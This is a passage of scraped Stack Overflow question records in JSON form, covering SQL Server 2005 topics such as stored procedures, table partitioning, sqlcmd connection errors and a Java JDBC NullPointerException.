when they run the package in the last step, they receive this error.  They are using SQL Server 2005.</p>\n\n<p>Can anyone advise where to begin looking for this problem?</p>\n\n<p>Thanks\nMike Thomas</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":10969,"score":2,"question_id":866139,"title":"Best way to find free space in sql server databases?","body":"<p>I want to be able to find out how much space is left in my database files so that I can know when to increase the space so it doesn't do it when the application is running hard out.</p>\n\n<p>I would prefer to be able to script this so I can run it across multiple databases ion a regular basis.</p>\n\n<p>I have SQL Server 2000 and SQL Server 2005 databases but I would prefer to be able to run the same script across both.   </p>\n\n<p>I can use Management Studio to do this manually on 2005 databases, but not on the 2000 databases.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":13,"favorite_count":7,"up_vote_count":25,"down_vote_count":0,"view_count":159250,"score":25,"question_id":185520,"title":"Convert Month Number to Month Name Function in SQL","body":"<p>I have months stored in SQL Server as 1,2,3,4,...12. I would like to display them as January,February etc. Is there a function in SQL Server like MonthName(1) = January? I am trying to avoid a CASE statement, if possible.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":2695,"score":4,"question_id":1393951,"title":"What is the best way to create and populate a numbers table?","body":"<p>I've seen many different ways to create and populate a numbers table.  However, what is the best way to create and populate one?  With \"best\" being defined from most to least important:</p>\n\n<ul>\n<li>Table created with optimal indexing</li>\n<li>rows generated fastest</li>\n<li>simple code used to create and populate</li>\n</ul>\n\n<p>If you don't know what a numbers table is, look here: <a href=\"http://sqlserver2000.databases.aspfaq.com/why-should-i-consider-using-an-auxiliary-numbers-table.html\" rel=\"nofollow\">Why should I consider using an auxiliary numbers table?</a></p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":103,"score":3,"question_id":12834838,"title":"Calling one stored procedure within another stored procedure using Variables from first stored procedure","body":"<p>I have a stored procedure say <code>@Create_Dummy1</code> which is being passed a Variable. This is declared as <code>@Dummy_Variable1</code> in this stored procedure. Next I need to Call another Stored procedure say <code>@Create_Dummy2</code> from <code>@Create_Dummy1</code>. I need to pass <code>@Dummy_Variable1</code> in <code>exec</code> statement. But if I try to do this the string <code>@Dummy_Variable1</code> is only being passed instead of the value it holds.</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":85,"score":-2,"question_id":12155480,"title":"Stored procedure SQL Server parameter","body":"<p>I want to write a stored procedure for the following SQL Server table:</p>\n\n<pre><code>No    Date          Days       Percentage\n 1    17-Aug-12      2          -0.34%\n 2    3-Aug-12       15         -29.39%\n 3    27-Jul-12      22          12.02%\n 4    20-Jul-12      29         -0.64%\n 5    13-Jul-12      36         -3.45%\n 6    6-Jul-12       43         -99.93%\n 7    29-Jun-12      50          41.26%\n</code></pre>\n\n<p>Here I want to pass parameter to the percentage column or the days column dynamically. </p>\n\n<p>Please help wite a stored procedure to select only percentages in a range say ‘12% - 15%’</p>\n"},{"tags":["sql-server","sql-server-2005","cascade"],"answer_count":10,"favorite_count":9,"up_vote_count":15,"down_vote_count":0,"view_count":25502,"score":15,"question_id":116968,"title":"In SQL Server 2005, can I do a cascade delete without setting the property on my tables?","body":"<p>I have a database full of customer data.  It's so big that it's really cumbersome to operate on, and I'd rather just slim it down to 10% of the customers, which is plenty for development.  I have an awful lot of tables and I don't want to alter them all with \"ON DELETE CASCADE\", especially because this is a one-time deal.</p>\n\n<p>Can I do a delete operation that cascades through all my tables without setting them up first?  If not, what is my best option?</p>\n"},{"tags":["sql-server","sql-server-2005","sqlcmd"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":4981,"score":6,"question_id":833678,"title":"SQLCMD, command-line variables and script :setvar","body":"<p>When running SQLCMD.exe and providing command-line arguments for scripting variables, I expect that the values provided on the command-line will override those defined in the SQL script file.</p>\n\n<p>e.g.</p>\n\n<p>Given the following SQL Script:</p>\n\n<pre><code>:setvar XXX \"SQL script\"\nprint '$(XXX)'\n</code></pre>\n\n<p>And the command line:</p>\n\n<pre><code>sqlcmd.exe -S &lt;Server&gt; -d &lt;Database&gt; -E -b -i &lt;Script&gt; -v XXX=\"Batch script\"\n</code></pre>\n\n<p>I expect the output to be:</p>\n\n<blockquote>\n  <p>Batch script</p>\n</blockquote>\n\n<p>However the output is:</p>\n\n<blockquote>\n  <p>SQL script</p>\n</blockquote>\n\n<p>Is this the intention, or must the <code>:setvar</code> statements in the SQL script be removed?</p>\n\n<p>I provided the <code>:setvar</code> statements in script, so I can edit/test the script in SQL Management Studio with SQLCMD mode, but run the scripts from the command-line in my test and production environments.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12831340,"title":"How to get a list of tables that has updated values","body":"<p>.Hi everyone, I need a little help on coming up with a query that lists all tables whose data was updated from a certain date to present.</p>\n\n<p>I'm using SQL Server 2012.</p>\n\n<p>TIA!</p>\n\n<p>Addt'l info:</p>\n\n<p>This is the query that I have so far:</p>\n\n<pre><code>Select distinct OBJECT_NAME(object_id) As TableName\nFrom sys.dm_db_index_usage_stats\nWhere user_updates &gt; 0\nAnd last_user_update &gt; cast('07/17/2012' as datetime)\norder by TableName\n</code></pre>\n\n<p>I wanted to get all the tables that had its data updated or new data inserted from 07/17/2012 to present.</p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":4185,"score":4,"question_id":923555,"title":"Text search in Stored Procedures in SQL Server 2005","body":"<p>How do I find a stored procedure containing a certain text? While I understand that the best place to do this kind of searching is through your source control tool, but are there ways to do this in the database? </p>\n"},{"tags":["sql-server","sql-server-2005","ssis","dts","ssdt"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":566,"score":1,"question_id":10905044,"title":"SSIS Transfer Database task cryptic error message 0x80131500","body":"<p>I am using SSIS with VS2010 (shell) and databases going from SQL Server 2005 (32 bit)to SQL Server 2012 (64 bit). I am developing directly on the destination server (not optimal, but it works).</p>\n\n<p>When I try to use the Transfer database task, it gives me an error message as follows:\n\"Error: The Execute method on the task returned error code 0x80131500 (An error occurred while transferring data. See the inner exception for details.). The Execute method must succeed, and indicate the result using an \"out\" parameter.\"\n<img src=\"http://i.stack.imgur.com/AG254.png\" alt=\"Error message\"></p>\n\n<p>Here is the problem... how do I view an \"inner exception\"?? it is a GUI interface with no way to step through the code! I even tried <a href=\"http://stackoverflow.com/questions/5772667/how-to-create-an-error-log-or-custom-error-log-within-an-ssis-package/6155087#6155087\">setting up logging</a> - it just logs the same useless error message.</p>\n\n<p>Microsoft has no information for this error code in their reference docs (that I could find).</p>\n\n<p>After googleing the error code, I saw others have this error code along with messages having to do with users, roles, and creating them. </p>\n\n<ul>\n<li>I double checked that I have sysadmin rights on both servers, and<br>\nlogins on both.  </li>\n<li>I tried the same Transfer Database task from each\nserver to itself (with changeing database name) and <em>that</em> worked\nfine for both by themselves. </li>\n<li>I tried both DatabaseOnline and DatabaseOffline options. (same error both ways)</li>\n<li>I tried doing a \"Transfer Logins\" task before doing the transfer database task, that task worked, but not the Transfer databases task. Then it started throwing errors saying that the databases don't exist - which implies that I need to transfer logins AFTER I transfer databases.</li>\n</ul>\n\n<p>Here are my settings:<img src=\"http://i.stack.imgur.com/EVnOG.png\" alt=\"enter image description here\"></p>\n\n<p>What am I doing wrong? <strong>OR</strong> how can I get the \"inner exception\" message?</p>\n\n<p>Also, follow my post to Microsoft's forums here:\n<a href=\"http://social.technet.microsoft.com/Forums/en-US/sqlintegrationservices/thread/cda53c80-8da6-4ed1-898a-9f3ff8464ae2\" rel=\"nofollow\">http://social.technet.microsoft.com/Forums/en-US/sqlintegrationservices/thread/cda53c80-8da6-4ed1-898a-9f3ff8464ae2</a></p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":9844345,"title":"Interrupting a database file shrink process in SSMS 2008","body":"<p>I recently removed table data from a batch of production databases and I've been shrinking the database files using the 'Shrink File' feature in SSMS.  Some of the databases will shrink more than 50gb.  I noticed that this processes takes a very long time to complete and that there is no cancel button while this process is running.  I am connecting to all the database servers remotely via RDP and cannot guarantee that they won't be power-cycled during the trim process.</p>\n\n<p>If the shrink process is running and the server is power-cycled, will I experience database corruption?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":40,"score":-2,"question_id":12827535,"title":"Convertion from Oracle PL/SQL to SQL SERVER 2005 - Moving record from one table to another","body":"<p>Please help me to convert the following Oracle PL/SQL block, in SQL SERVER 2005:</p>\n\n<pre><code>BEGIN \n    DECLARE \n        deleted_rows NUMBER DEFAULT 10000; \n        CURSOR c1 IS \n          SELECT DISTINCT Trunc(build_date) \n          FROM   my_table \n          FOR UPDATE; \n        c1_rec       c1%ROWTYPE; \n    BEGIN \n        FOR c1_rec IN c1 LOOP \n            INSERT INTO my_table_copy \n            SELECT * \n            FROM   my_table \n            WHERE  build_date = c1_rec.my_date; \n\n            COMMIT; \n\n            deleted_rows := 10000; \n\n            WHILE deleted_rows = 10000 LOOP \n                DELETE FROM my_table \n                WHERE  build_date = c1_rec.my_date \n                       AND ROWNUM &lt;= 10000; \n\n                deleted_rows := SQL%rowcount; \n            END LOOP; \n\n            COMMIT; \n        END LOOP; \n    END; \nEND; \n\n/ \n</code></pre>\n"},{"tags":["sql","sql-server-2005","foreign-keys","primary-key"],"answer_count":3,"favorite_count":4,"up_vote_count":6,"down_vote_count":1,"view_count":24287,"score":5,"question_id":1350990,"title":"How to add composite primary key to table","body":"<pre><code>create table d(id numeric(1), code varchar(2))\n</code></pre>\n\n<p>After I create the above table how can I add a composite primary key on both fields and also a foreign key?</p>\n"},{"tags":["sql-server-2005","indexing","scriptgenerate"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3440,"score":0,"question_id":776527,"title":"SQLServer 2005 Generate all INDEX as CREATE statement?","body":"<p>I have two database with same structures, but one of them is missing INDEXES (i think i've missed out), i mean the table didn't have any INDEXES yet.</p>\n\n<p>I was plan to generate CREATE INDEX for the database which have indexes but can't found any method available in Management Studio, yes we can generate script for tables, view, etc, but i was only need to script the INDEXES not anything else.</p>\n\n<p>I know if we generate a script using IF EXIST can be solution, so if object already exist it doesn't recreate, but again for simplicity shake, i just want script the INDEXES.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12812962,"title":"Error in the return value of the stored procedure","body":"<p>I have written a stored procedure and having a varchar(200) varibale as return variable, but in the output its showing as \"conversion failed while converting varchar value to integer\", in teh procedure im not converting to int, but im facing error</p>\n\n<pre><code>alter proc rulename @mfid varchar(20)\nas\ndeclare @ACF2 varchar(200)\nbegin \nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where      MFID=@mfid) &gt; 0)\nbegin\nset @ACF2='Apollo'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + 'GP'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Tactical Comp'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Unit Valuation'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'NPVS'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Apollo Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'GP Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Tactical Comp Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'Unit Valuation Test'\nend\nif((select count(distinct(Rulename)) as count1 from MainframeExtractsPLP where MFID=@mfid) &gt; 0)\nbegin\nset @ACF2= @ACF2 + ',' + 'NPVS Test'\nend\nreturn @ACF2\nend\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":126,"score":1,"question_id":12818765,"title":"How to merge multiple rows of single column in sql server 2005?","body":"<p>I get a output as shown in below table from my query as </p>\n\n<p><img src=\"http://i.stack.imgur.com/GRHK5.jpg\" alt=\"enter image description here\"></p>\n\n<p>Now I need my output should something like below table</p>\n\n<p><img src=\"http://i.stack.imgur.com/OlfOV.jpg\" alt=\"enter image description here\"></p>\n\n<p>It will merge the common fields of multiple rows into one cell.</p>\n\n<p>Please help me to achieve this in possible in query level.</p>\n"},{"tags":["c#","sql-server-2005","linq-to-entities"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1322,"score":5,"question_id":2431908,"title":"Linq to Entities : using ToLower() on NText fields","body":"<p>I'm using SQL Server 2005, with a case sensitive database.. </p>\n\n<p>In a search function, I need to create a Linq To Entities (L2E) query with a \"where\" clause that compare several strings with the data in the database with these rules :</p>\n\n<ol>\n<li>The comparison is a \"Contains\" mode, not strict compare : easy as the string's Contains() method is allowed in L2E</li>\n<li>The comparison must be case insensitive : I use ToLower() on both elements to perform an insensitive comparison.</li>\n</ol>\n\n<p>All of this performs really well but I ran into the following Exception : \n\"Argument data type ntext is invalid for argument 1 of lower function\" on one of my fields.  </p>\n\n<p>It seems that the field is a NText field and I can't perform a ToLower() on that.<br>\nWhat could I do to be able to perform a case insensitive Contains() on that NText field ?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":754628,"title":"Why I can't find syslanguages table in my sql server 2005?","body":"<p>It is said this table is contained in 'master', but I couldn't find it.\nDo somebody know the reason?\nHow to fix it?</p>\n"},{"tags":["sql","mysql","sql-server-2005"],"answer_count":17,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":18473,"score":2,"question_id":2160262,"title":"Query for second maximum salary from employee table","body":"<p>How to find out second maximum salary from all employee in employee table? </p>\n\n<p>Please give me the SQL query.</p>\n"},{"tags":["sql-server-2005","service","windows-vista"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12820540,"title":"Downloading Group Policy Management Console for Windows Vista?","body":"<p>I'm trying to download Group Policy Management Console for Windows Vista Enterprise from <a href=\"http://www.microsoft.com/en-gb/download/details.aspx?id=21895\" rel=\"nofollow\">here</a> </p>\n\n<p>But when I run the program to install this, an error message comes up saying \"This program is blocked due to compatibility issues... Microsoft Group Policy Management Console (GPMC) v.1.1 is incompatible with this version of Windows.\"</p>\n\n<p>Does anyone know where I can find a compatible version, or how I can get this to work?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":432,"score":0,"question_id":4306966,"title":"SQL Server query with multiple values in one column relating to another column","body":"<p><b>Situation:</b> This table holds the relation information between a Documents table and an Users table. Certain Users need to review or approve documents (Type). I would like to have it to where I could get all of the reviewers on one line if needed. So if three users review Document 1, then a row would have 346, 394, 519 as the value, since those are the reviewers</p>\n\n<p><b>Table:</b> xDocumentsUsers</p>\n\n<pre><code>DocID..UserID....Type...\n1........386......approver\n1........346......reviewer\n1........394......reviewer..\n1........519......reviewer..\n4........408......reviewer..\n5........408......reviewer..\n6........408......reviewer..\n7........386......approver..\n7........111......readdone..\n7........346......reviewer..\n8........386......approver..\n8........346......reviewer..\n9........386......approver..\n9........346......reviewer..\n10.......386......approver..\n11.......386......approver..\n11......346......reviewer..\n12......386......approver..\n12......346......reviewer..\n13......386......approver..\n13......346......reviewer..\n14......386......approver..\n14......346......reviewer..\n15......386......approver\n</code></pre>\n\n<p>So desired result would be...</p>\n\n<p><b>DocID..UserID................Type...</b></p>\n\n<pre><code>1........386....................approver\n1........346,394,519......reviewer.\n4........408....................reviewer..\n5........408....................reviewer..\n6........408....................reviewer..\n7........386....................approver..\n7........111....................readdone..\n7........346....................reviewer..\n8........386....................approver..\n8........346....................reviewer..\n9........386....................approver..\n9........346....................reviewer..\n10......386....................approver..\n11......386....................approver..\n11......346....................reviewer..\n12......386....................approver..\n12......346....................reviewer..\n13......386....................approver..\n13......346....................reviewer..\n14......386....................approver..\n14......346....................reviewer..\n15......386....................approver\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12819208,"title":"select data from another database","body":"<p>I work with a database db1 ,and i have a stocked procedure that select data from another database like that </p>\n\n<blockquote>\n<pre><code>select name from db2..table\n</code></pre>\n</blockquote>\n\n<p>the same code work fine in other machine but not in mine\nI tink this is a probleme with user privileges in sql-server.\nTanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","try-catch"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12816539,"title":"SQL TRY-CATCH and the missing columns","body":"<p>I have the following (SQL Server 2005)</p>\n\n<pre><code>DECLARE @L_ID_FOO_BAR INT\n\nBEGIN TRY\n  SELECT @L_ID_FOO_BAR = IDFOO \n  FROM BAR\n  WHERE IDFOO = 5\nEND TRY\nBEGIN CATCH\n  SELECT @L_ID_FOO_BAR = NULL\nEND CATCH\n</code></pre>\n\n<p>in the BAR table I could have (on old databases) or not (in some more recennt databases) the IDFOO column. So, for the missing IDFOO column I'd like to leave @L_ID_FOO_BAR = NULL, in case if that column exists select the respective IDFOO.</p>\n\n<p>However, when executing the script on bases without that column I obtain:</p>\n\n<blockquote>\n  <p>Invalid column name: 'IDFOO'</p>\n</blockquote>\n\n<p>I already surrounded the script with </p>\n\n<pre><code>IF EXISTS(SELECT 1 FROM SYSCOLUMNS \nWHERE ID = OBJECT_ID('BAR') AND NAME = 'IDFOO') \n</code></pre>\n\n<p>but this didn't help, it complains about the invalid column...</p>\n\n<p>Questions<br>\na) <strong>What to do</strong> to make work this script on both databases, with or without that column?<br>\nb) <strong>Why</strong> does try-catch not hide the invalid column error?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","schema"],"answer_count":4,"favorite_count":5,"up_vote_count":10,"down_vote_count":0,"view_count":7829,"score":10,"question_id":316485,"title":"rename schema in SQL server 2005","body":"<p>How can I rename a schema in SQL Server 2005? </p>\n"},{"tags":["sql-server-2005","database-design"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":218,"score":0,"question_id":12451826,"title":"SQL Table Partition Error - Cannot Add A New Partition To Existing Partitioned Table","body":"<p>I have inherited a SQL Server and I have discovered a table partitioning issue.  I cannot add a new partition to an existing table partition for reasons I am unsure of.  </p>\n\n<p><strong>Environment:</strong></p>\n\n<p>SQL Server 2005 Enterprise,\nDatabase approximately 400GB in size,\n4GB RAM,\n32 BIT system only.</p>\n\n<p><strong>Partitioned Table Details:</strong></p>\n\n<p>*Table is partitioned across 13 filegroups on multiple disk volumes.</p>\n\n<p>*Partition Function is RANGE LEFT with 12 boundary points that are datetime values.</p>\n\n<p>*Boundary points are structured in a date quarterly structure (example: 2009-12-31 23:59:59, 2010-03-31 23:59:59, 2010-06-30 23:59:59).</p>\n\n<p>*The datetime value is the Partition Key.</p>\n\n<p>*Data is inserted daily into the table based on the current date, however only the last filegroup receives data as the last boundary point on the function is '2010-06-30 23:59:59'.</p>\n\n<p>*Table has a Clustered Index that is aligned with the table, and 3 Non-Unique Non-Clustered Indexes (2 are aligned, 1 exists on a different filegroup altogether).</p>\n\n<p>*Current Table volume details:</p>\n\n<p>Data Space: 75GB+</p>\n\n<p>Index Space:    50GB+</p>\n\n<p>Row Count:  200 million+</p>\n\n<p><strong>Issue:</strong></p>\n\n<p>Currently the last filegroup/partition has no maximum date boundary point, so all data after the date '2010-06-30 23:59:59' has been/is still being inserted into this partition.  Luckily transactional data volumes are rather small, however over a two year period the final partition has grown to an impressive 22GB size.  I do not wish to split or remove data from this existing partition.  I do however want to add a new filegroup and alter the existing partition function so that all future data is inserted into the new filegroup.  I want to add a new future date as a boundary point so that all inserted data after that date goes to a new filegroup/partition.</p>\n\n<p><strong>Method Used:</strong></p>\n\n<p>Added a new filegroup/file using the ALTER DATABASE function - <em>SUCCESS</em>.</p>\n\n<p>Altered the Partition Scheme so that the newly created filegroup was allocated 'NEXT USED' - <em>SUCCESS</em>.\n--SCRIPT USED TO ALTER PARTITION SCHEME--</p>\n\n<p>ALTER PARTITION SCHEME [partition_scheme_name]\nNEXT USED (new_filegroup_name);</p>\n\n<p>Altered the Partition Function to add the new boundary point - <em>FAIL</em>.</p>\n\n<p>--SCRIPT USED TO ADD NEW BOUNDARY POINT TO FUNCTION--</p>\n\n<p>ALTER PARTITION FUNCTION partition_function_name()\nSPLIT RANGE ('2012-10-01 23:59:59)\nGO</p>\n\n<p><strong>Error:</strong></p>\n\n<p>Adding the new boundary point to the existing partition using the SPLIT RANGE technique failed because the database transaction log filled up (restricted to 18GB).  This took me by surprise for 2 reasons - 1): I thought using SPLIT RANGE was a metadata function only (please correct me if I am wrong) and 2): my new boundary point does not exist in the table as yet as a date value so I assumed there would be no data movement.</p>\n\n<p><strong>What I have tried so far:</strong></p>\n\n<p>*I tested this method successfully using a test server but with a much smaller dataset.</p>\n\n<p>*I then restored a complete copy of the production database onto a test system.  I added a second database log file with unlimited growth and attempted to alter the Partition Function again.  The original database transaction log filled up as expected, but the secondary database transaction log grew to 60GB!  In addition the tempdb grew to 14GB.  The new filegroup started to increase in size when the whole process aborted again due to a different error.  This time the error was:</p>\n\n<p>('Cannot insert duplicate key row in object 'table_name' with unique index 'Index_name').</p>\n\n<p>Now there are TWO things that completely puzzle me here:</p>\n\n<p>1): The index mentioned in the error from testing is a Non-Clustered, Non-Unique Index - why would I get a duplicate error?</p>\n\n<p>2): More to the point, I am adding a new datetime value as a new maximum boundary point and this value does not exist in the table yet.  Why would there be data movement???</p>\n\n<p>As said I have tested this method using a much smaller data set and it worked perfectly.  I don't understand why it will not work with the production dataset.  Am I missing something very obvious here?  Any advice is greatly appreciated.  Thank you for your time.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-express","sqlcmd","sql-server-native-client"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1269,"score":0,"question_id":5803326,"title":"sqlcmd not working after installing sql server 2005 express","body":"<p>I downloaded the 53.5 MB setup of SQL Server 2005 Express from this URL:  </p>\n\n<p><a href=\"http://www.microsoft.com/downloads/en/details.aspx?familyid=220549B5-0B07-4448-8848-DCC397514B41&amp;displaylang=en\" rel=\"nofollow\">http://www.microsoft.com/downloads/en/details.aspx?familyid=220549B5-0B07-4448-8848-DCC397514B41&amp;displaylang=en</a></p>\n\n<p>Then I ran sqlcmd by going into command promp , but it shows error</p>\n\n<blockquote>\n  <p>HResult 0x2, Level 16, State 1<br>\n  Named Pipes Provider: Could not open a connection to SQL Server [2].<br>\n  Sqlcmd: Error: Microsoft SQL Native Client : An error has occurred\n  while establishing a connection to the server. When connecting to SQL Server 2005,\n  this failure may be caused by the fact that under the default settings SQL Server\n  does not allow remote connections..</p>\n  \n  <p>Sqlcmd: Error: Microsoft SQL Native Client : Login timeout expired.</p>\n</blockquote>\n\n<p>Then I downloaded and installed Sql Command Line Utility from this URL: </p>\n\n<p><a href=\"http://www.microsoft.com/downloads/en/details.aspx?FamilyID=d09c1d60-a13c-4479-9b91-9e8b9d835cdc&amp;displaylang=en\" rel=\"nofollow\">http://www.microsoft.com/downloads/en/details.aspx?FamilyID=d09c1d60-a13c-4479-9b91-9e8b9d835cdc&amp;displaylang=en</a></p>\n\n<p>Then also it shows the same error.</p>\n\n<p>Then I installed Sql Native Client, then also it didn't work. But when I installed Management Studio, then from Management Studio the connection is established, but not from sqlcmd from Command Prompt. </p>\n\n<p>Please help. </p>\n"},{"tags":["sql","sql-server-2005","jobs"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":12563692,"title":"sql server 2005 - Create job to check if a particular data in a column exists","body":"<p>I want to check a sql server 2005 database table if a range of data in the column exists and this is to be checked on an hourly basis.</p>\n\n<p>If it exists I will want to trigger an email to users.The email will say that the range that was specified by the user exists</p>\n\n<p>I am trying the following procedure at the moment</p>\n\n<pre><code>DECLARE @xml NVARCHAR(MAX)\nDECLARE @body NVARCHAR(MAX)\n\nSET @xml = CAST(( SELECT [No] AS 'td','',[date] AS 'td','',\n                  [DAYS] AS 'td','', Variance AS 'td'\nFROM  TestTbl \nWHERE(Variance &gt;= @Start AND Variance &lt; @End)\nAND CAST(CONVERT(VARCHAR,curDate,106) AS DATETIME) = CAST(@Date AS DATETIME)\nORDER BY No \nFOR XML PATH('tr'), ELEMENTS ) AS NVARCHAR(MAX))\n\nSET @body ='&lt;html&gt;&lt;body&gt;&lt;H3&gt;test Report&lt;/H3&gt;\n&lt;table border = 1&gt; \n&lt;tr&gt;\n&lt;th&gt; No &lt;/th&gt; &lt;th&gt; date &lt;/th&gt; &lt;th&gt; DAYS &lt;/th&gt; &lt;th&gt; Variance &lt;/th&gt;&lt;/tr&gt;'    \n\nSET @body = @body + @xml +'&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;'\n</code></pre>\n\n<p>Every hour I want the database to be checked for the data range ...If it exists I want to trigger an email based on the condition</p>\n\n<p>Thanks</p>\n"},{"tags":["java","sql-server-2005","jsp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":12811737,"title":"HTTP Status 500 error. Eclipse+Tomcat+MS SQL 2005","body":"<p>I am trying this code in order for me to understand how to connect MS SQL 2005 to Eclipse and Tomcat 7 as my server. I am just new in making a java web application so please bear with me. In the error below, how can i trace where is the cause of the error? The project have 2 jsp, and 3 class files. <code>index.jsp</code>, <code>result.jsp</code>, <code>SQLConnection.java</code>, <code>Items.java</code> and <code>ItemController.java</code>.</p>\n\n<p><strong>The error goes like this,</strong></p>\n\n<pre><code>type Exception report\n\nmessage \n\ndescription The server encountered an internal error () that prevented it from    fulfilling this request.\n\nexception \n\norg.apache.jasper.JasperException: java.lang.NullPointerException\n      org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:549)\norg.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)\norg.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)\norg.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:722)\n\n\nroot cause \n\njava.lang.NullPointerException\nconnection.SQLConnection.execSelectQuery(SQLConnection.java:35)\nmodel.Item.lastItems(Item.java:10)\norg.apache.jsp.index_jsp._jspService(index_jsp.java:83)\norg.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:722)\norg.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)\norg.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)\norg.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)\njavax.servlet.http.HttpServlet.service(HttpServlet.java:722)\n</code></pre>\n\n<p>The code for SQLConnection.java and index.jsp are as follows;</p>\n\n<p>SQLConnection.java</p>\n\n<pre><code>    package connection;\n    import java.sql.*;\n    public class SQLConnection {\n    protected Connection con=null;\n    protected ResultSet rs=null;\n\n    public SQLConnection(String address)\n    {\n        try\n    {\n    String conString = \"jdbc:sqlserver://localhost:1433;databaseName=Chingdb;    integratedSecurity=true;\";\ncon = DriverManager.getConnection(conString);\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\n}\n}\npublic boolean execQuery(String sql)\n{\nboolean result = false;\ntry\n{\nStatement stmt = con.createStatement();\nstmt.execute(sql);\nresult = true;\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\nresult = false;\n}\nreturn result;\n}\npublic void execSelectQuery(String sql)\n{\ntry\n{\nStatement stmt = con.createStatement();\nthis.rs = stmt.executeQuery(sql);\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\n}\n}\npublic void disconnect()\n{\ntry\n{\ncon.close();\n}catch(SQLException sqlError){\n//ERROR MANAGEMENT HERE\n}\n\n}\n}\n</code></pre>\n\n<p>index.jsp</p>\n\n<pre><code>&lt;%@ page language=\"java\" contentType=\"text/html; charset=ISO-8859-1\" pageEncoding=\"ISO-8859-1\"%&gt;\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org    /TR/html4/loose.dtd\"&gt;\n&lt;%@page 